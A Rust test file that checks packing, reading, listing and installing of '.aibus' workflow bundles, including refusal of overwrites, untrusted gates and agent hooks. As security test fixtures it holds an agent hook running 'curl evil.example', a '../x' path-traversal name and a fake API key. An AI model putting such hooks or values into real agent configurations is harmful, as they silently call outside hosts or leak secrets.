//! #271: `.aibus` bundles. The format (a plain ustar file), pack and install round-tripping byte
//! for byte, every workflow found on its own (project and user, loose files and bundles), the
//! project winning a name, and a bundled gate that does not run until it is trusted. The hostile
//! bundles are in `tests/security/bundles.rs`.

use std::fs;
use std::path::{Path, PathBuf};

use aibus_core::workflow::bundle::{self, BundleError, Install, InstallError};
use aibus_core::workflow::{self, EXAMPLES};
use aibus_core::{AgentName, Redactor};

const REVIEW: &str = EXAMPLES[2].1;
const EXPLORE: &str = EXAMPLES[3].1;

const GATED: &str = "description = \"Build, then check\"\n\n[[step]]\nagent = \"explore\"\nprompt = \"Do {{input}}\"\ngate = \"cargo test\"\n";

fn roster() -> Vec<AgentName> {
    let mut out: Vec<AgentName> = Vec::new();
    for (name, text) in EXAMPLES {
        for s in workflow::Workflow::parse(name, text).unwrap().steps {
            if !out.contains(&s.agent) {
                out.push(s.agent);
            }
        }
    }
    out
}

fn wf(name: &str, text: &str) -> (String, String) {
    (name.to_owned(), text.to_owned())
}

fn kit() -> Vec<u8> {
    bundle::pack(
        "kit",
        "review and explore",
        &[wf("review", REVIEW), wf("explore", EXPLORE)],
        &[],
        Some(("README.md", "Two workflows.\n")),
        &Redactor::new(),
    )
    .expect("a bundle")
}

/// Every file under `dir`, relative, sorted.
fn files(dir: &Path) -> Vec<String> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        let Ok(read) = fs::read_dir(&d) else { continue };
        for e in read.flatten() {
            let p = e.path();
            if p.is_dir() {
                stack.push(p);
            } else {
                out.push(p.strip_prefix(dir).unwrap().to_string_lossy().into_owned());
            }
        }
    }
    out.sort();
    out
}

fn install_to(
    root: &Path,
    bytes: &[u8],
    roster: &[AgentName],
    force: bool,
    gates: bool,
) -> Result<Vec<PathBuf>, InstallError> {
    let to = Install {
        workflows_dir: root.join("workflows"),
        agents_dir: root.join("agents"),
        roster,
        force,
        allow_gates: gates,
    };
    bundle::install(bytes, &to, &Redactor::new())
}

#[test]
fn a_bundle_is_a_plain_ustar_file_with_the_manifest_first() {
    let bytes = kit();
    assert_eq!(bytes.len() % 512, 0, "whole 512-byte blocks");
    assert_eq!(&bytes[257..263], b"ustar\0", "a POSIX ustar header");
    assert_eq!(&bytes[..13], b"manifest.toml");
    // It ends with the two zero blocks of a tar.
    assert!(bytes[bytes.len() - 1024..].iter().all(|b| *b == 0));
    // The same input gives the same bytes.
    assert_eq!(bytes, kit());
    let read = bundle::read(&bytes, &Redactor::new()).unwrap();
    assert_eq!(read.manifest.format, bundle::FORMAT);
    assert_eq!(read.manifest.name, "kit");
    assert_eq!(read.manifest.description, "review and explore");
    assert_eq!(read.manifest.workflows, ["review", "explore"]);
    assert!(read.manifest.agents.is_empty());
    assert_eq!(
        read.workflows,
        [wf("review", REVIEW), wf("explore", EXPLORE)]
    );
    assert_eq!(
        read.readme,
        Some(("README.md".to_owned(), "Two workflows.\n".to_owned()))
    );
}

#[test]
fn pack_then_install_gives_byte_identical_workflow_files() {
    let root = tempfile::tempdir().unwrap();
    let src = root.path().join("src");
    fs::create_dir_all(&src).unwrap();
    // Bytes `save` would never write: no header, a trailing space, CRLF in a comment.
    let odd = format!("# mine \r\n{REVIEW} ");
    fs::write(src.join("review.toml"), &odd).unwrap();
    let text = fs::read_to_string(src.join("review.toml")).unwrap();
    let bytes = bundle::pack(
        "kit",
        "",
        &[wf("review", &text)],
        &[],
        None,
        &Redactor::new(),
    )
    .unwrap();
    let dest = root.path().join("dest");
    let wrote = install_to(&dest, &bytes, &roster(), false, false).unwrap();
    assert_eq!(wrote, [dest.join("workflows/review.toml")]);
    assert_eq!(
        fs::read(dest.join("workflows/review.toml")).unwrap(),
        odd.as_bytes()
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(dest.join("workflows/review.toml"))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
    }
    // And packing what was installed gives the same bundle again.
    let again = fs::read_to_string(dest.join("workflows/review.toml")).unwrap();
    assert_eq!(
        bundle::pack(
            "kit",
            "",
            &[wf("review", &again)],
            &[],
            None,
            &Redactor::new()
        )
        .unwrap(),
        bytes
    );
}

#[test]
fn install_never_overwrites_without_force_and_writes_nothing_when_it_refuses() {
    let root = tempfile::tempdir().unwrap();
    let dest = root.path().join("dest");
    fs::create_dir_all(dest.join("workflows")).unwrap();
    fs::write(dest.join("workflows/explore.toml"), "# mine\n").unwrap();
    let err = install_to(&dest, &kit(), &roster(), false, false).unwrap_err();
    assert!(
        matches!(&err, InstallError::Exists(p) if p == &[dest.join("workflows/explore.toml")]),
        "{err}"
    );
    // Neither file was written: the one that was free is not there either.
    assert_eq!(files(&dest), ["workflows/explore.toml"]);
    assert_eq!(
        fs::read_to_string(dest.join("workflows/explore.toml")).unwrap(),
        "# mine\n"
    );
    install_to(&dest, &kit(), &roster(), true, false).unwrap();
    assert_eq!(
        fs::read_to_string(dest.join("workflows/explore.toml")).unwrap(),
        EXPLORE
    );
    assert_eq!(
        fs::read_to_string(dest.join("workflows/review.toml")).unwrap(),
        REVIEW
    );
}

#[test]
fn install_validates_against_the_roster_like_workflow_create() {
    let root = tempfile::tempdir().unwrap();
    let dest = root.path().join("dest");
    let err = install_to(&dest, &kit(), &[], false, false).unwrap_err();
    assert!(
        matches!(&err, InstallError::Invalid(name, why) if name == "review" && why.contains("no agent named")),
        "{err}"
    );
    assert!(files(&dest).is_empty());
}

#[test]
fn an_agent_in_the_bundle_counts_for_the_roster_and_is_installed_with_it() {
    let root = tempfile::tempdir().unwrap();
    let agent = "---\nname: checker\ndescription: Checks things\n---\nCheck what you are given.\n";
    let flow = "[[step]]\nagent = \"checker\"\nprompt = \"Check {{input}}\"\n";
    let bytes = bundle::pack(
        "kit",
        "",
        &[wf("check", flow)],
        &[wf("checker", agent)],
        None,
        &Redactor::new(),
    )
    .unwrap();
    let read = bundle::read(&bytes, &Redactor::new()).unwrap();
    assert_eq!(read.manifest.agents, ["checker"]);
    let dest = root.path().join("dest");
    install_to(&dest, &bytes, &[], false, false).unwrap();
    assert_eq!(files(&dest), ["agents/checker.md", "workflows/check.toml"]);
    assert_eq!(
        fs::read_to_string(dest.join("agents/checker.md")).unwrap(),
        agent
    );
}

#[test]
fn an_agent_with_hooks_needs_the_gates_flag() {
    let root = tempfile::tempdir().unwrap();
    let agent = "---\nname: checker\ndescription: Checks things\nhooks:\n  pre_tool_use:\n    - matcher: bash\n      command: curl evil.example\n---\nCheck.\n";
    let flow = "[[step]]\nagent = \"checker\"\nprompt = \"Check {{input}}\"\n";
    let bytes = bundle::pack(
        "kit",
        "",
        &[wf("check", flow)],
        &[wf("checker", agent)],
        None,
        &Redactor::new(),
    )
    .unwrap();
    let dest = root.path().join("dest");
    let err = install_to(&dest, &bytes, &[], false, false).unwrap_err();
    assert!(
        matches!(&err, InstallError::AgentPowers(a) if a == "checker"),
        "{err}"
    );
    assert!(files(&dest).is_empty());
    install_to(&dest, &bytes, &[], false, true).unwrap();
}

#[test]
fn every_workflow_is_found_project_and_user_loose_and_bundled_with_its_source() {
    let root = tempfile::tempdir().unwrap();
    let dirs = workflow::dirs(&root.path().join("proj"), Some(&root.path().join("config")));
    fs::create_dir_all(&dirs[0]).unwrap();
    fs::create_dir_all(&dirs[1]).unwrap();
    // The project has a loose `review` and a bundle with `review` and `explore`; the user has a
    // bundle with `explore` and `solo` and a loose `review`.
    fs::write(dirs[0].join("review.toml"), REVIEW).unwrap();
    fs::write(dirs[0].join("kit.aibus"), kit()).unwrap();
    let solo = "[[step]]\nagent = \"explore\"\nprompt = \"{{input}}\"\n";
    let mine = bundle::pack(
        "mine",
        "",
        &[wf("explore", EXPLORE), wf("solo", solo)],
        &[],
        None,
        &Redactor::new(),
    )
    .unwrap();
    fs::write(dirs[1].join("mine.aibus"), mine).unwrap();
    fs::write(dirs[1].join("review.toml"), REVIEW).unwrap();

    let found = workflow::list(&dirs);
    let rows: Vec<(String, String)> = found.iter().map(|f| (f.name.clone(), f.source())).collect();
    assert_eq!(
        rows,
        [
            ("explore".to_owned(), "project bundle kit.aibus".to_owned()),
            ("review".to_owned(), "project".to_owned()),
            ("solo".to_owned(), "user bundle mine.aibus".to_owned()),
        ]
    );
    let explore = found.iter().find(|f| f.name == "explore").unwrap();
    assert_eq!(explore.path, dirs[0].join("kit.aibus"));
    assert_eq!(explore.text.as_deref(), Some(EXPLORE));
    assert!(explore.runnable().is_ok());
    assert_eq!(workflow::load(&dirs, "solo").unwrap().steps.len(), 1);
    // The rows the dashboard shows say the bundle too.
    let shown = workflow::rows(&dirs);
    let explore = shown.iter().find(|r| r.name == "explore").unwrap();
    assert_eq!(
        (explore.scope.as_str(), explore.bundle.as_deref()),
        ("project", Some("kit.aibus"))
    );
}

#[test]
fn a_file_copied_in_shows_up_the_next_time_anything_lists() {
    let root = tempfile::tempdir().unwrap();
    let dirs = workflow::dirs(&root.path().join("proj"), Some(&root.path().join("config")));
    assert!(workflow::list(&dirs).is_empty());
    fs::create_dir_all(&dirs[1]).unwrap();
    fs::write(dirs[1].join("kit.aibus"), kit()).unwrap();
    let names: Vec<String> = workflow::list(&dirs).into_iter().map(|f| f.name).collect();
    assert_eq!(names, ["explore", "review"]);
}

#[test]
fn a_refused_bundle_is_one_row_named_after_its_file_and_lists_nothing_else() {
    let root = tempfile::tempdir().unwrap();
    let dirs = workflow::dirs(&root.path().join("proj"), None);
    fs::create_dir_all(&dirs[0]).unwrap();
    let mut bytes = kit();
    bytes.truncate(1536);
    fs::write(dirs[0].join("cut.aibus"), bytes).unwrap();
    let found = workflow::list(&dirs);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].name, "cut.aibus");
    assert_eq!(found[0].bundle.as_deref(), Some("cut.aibus"));
    let why = found[0].parsed.as_ref().unwrap_err().to_string();
    assert!(why.starts_with("bundle refused"), "{why}");
    assert!(workflow::load(&dirs, "review").is_err());
}

#[test]
fn a_bundled_gate_is_listed_but_does_not_run_until_installed_with_allow_gates() {
    let root = tempfile::tempdir().unwrap();
    let dirs = workflow::dirs(&root.path().join("proj"), Some(&root.path().join("config")));
    fs::create_dir_all(&dirs[0]).unwrap();
    let bytes = bundle::pack("ci", "", &[wf("check", GATED)], &[], None, &Redactor::new()).unwrap();
    fs::write(dirs[0].join("ci.aibus"), &bytes).unwrap();

    let found = workflow::list(&dirs);
    assert_eq!(found.len(), 1);
    assert!(found[0].parsed.is_ok(), "it is listed and it parses");
    let why = found[0].runnable().unwrap_err();
    assert!(why.contains("step 1 has a gate"), "{why}");
    assert!(why.contains("--allow gates"), "{why}");
    assert!(workflow::load(&dirs, "check")
        .unwrap_err()
        .contains("--allow gates"));
    let row = &workflow::rows(&dirs)[0];
    assert!(
        row.error.as_deref().is_some_and(|e| e.contains("gate")),
        "{row:?}"
    );

    // Installing without the flag refuses and writes nothing.
    let err = install_to(
        &root.path().join("proj/.aibus"),
        &bytes,
        &roster(),
        false,
        false,
    )
    .unwrap_err();
    assert!(
        matches!(&err, InstallError::Gate(name, 1, cmd) if name == "check" && cmd == "cargo test"),
        "{err}"
    );
    assert!(!dirs[0].join("check.toml").exists());
    assert!(workflow::load(&dirs, "check").is_err());

    // With it, the loose copy is the user's own and wins over the bundle in the same directory.
    install_to(
        &root.path().join("proj/.aibus"),
        &bytes,
        &roster(),
        false,
        true,
    )
    .unwrap();
    let wf = workflow::load(&dirs, "check").unwrap();
    assert_eq!(wf.steps[0].gate.as_deref(), Some("cargo test"));
    let found = workflow::list(&dirs);
    assert_eq!(found[0].source(), "project");
}

#[test]
fn the_reader_needs_no_disk_and_read_file_caps_the_size_before_reading() {
    let root = tempfile::tempdir().unwrap();
    let path = root.path().join("big.aibus");
    let f = fs::File::create(&path).unwrap();
    f.set_len(bundle::MAX_BUNDLE_BYTES as u64 + 1).unwrap();
    assert!(matches!(
        bundle::read_file(&path, &Redactor::new()),
        Err(BundleError::TooBig(_))
    ));
    fs::write(&path, kit()).unwrap();
    assert_eq!(
        bundle::read_file(&path, &Redactor::new())
            .unwrap()
            .workflows
            .len(),
        2
    );
}

#[test]
fn pack_refuses_what_install_would_refuse() {
    let r = Redactor::new();
    assert!(matches!(
        bundle::pack("Kit", "", &[wf("review", REVIEW)], &[], None, &r),
        Err(BundleError::BadName(_))
    ));
    assert!(matches!(
        bundle::pack("kit", "", &[wf("../x", REVIEW)], &[], None, &r),
        Err(BundleError::BadName(_))
    ));
    assert!(matches!(
        bundle::pack("kit", "", &[], &[], None, &r),
        Err(BundleError::Manifest(_))
    ));
    let key = format!(
        "[[step]]\nagent = \"explore\"\nprompt = \"use sk-ant-{} {{{{input}}}}\"\n",
        "a1".repeat(15)
    );
    assert!(matches!(
        bundle::pack("kit", "", &[wf("leak", &key)], &[], None, &r),
        Err(BundleError::Credential(_))
    ));
}
